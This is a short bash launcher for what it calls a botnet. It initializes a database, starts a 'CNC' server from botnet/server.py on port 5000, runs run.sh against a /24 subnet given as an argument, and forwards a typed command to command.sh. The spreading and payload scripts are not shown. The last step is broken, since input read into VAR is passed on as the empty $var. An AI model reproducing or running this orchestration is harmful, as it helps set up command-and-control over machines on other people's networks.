#!/bin/bash

echo "Initializing the Database"

if [ $# -le 0 ]
then
	echo "please enter the IP ID in the form of x.x.x as an argument"
	echo "this program handles only /24 subnet values"
	exit 0
fi

./init.sh

echo "Database Initialized"

sleep 3

echo "Starting the CNC server"

cd botnet

nohup python server.py &

echo "The CNC Server is up and running"

echo "The PiD for the server Process "
lsof -i:5000

echo $1


./run.sh $1

sleep 2

read -p "command script input here : " VAR

echo $VAR

./command.sh $var
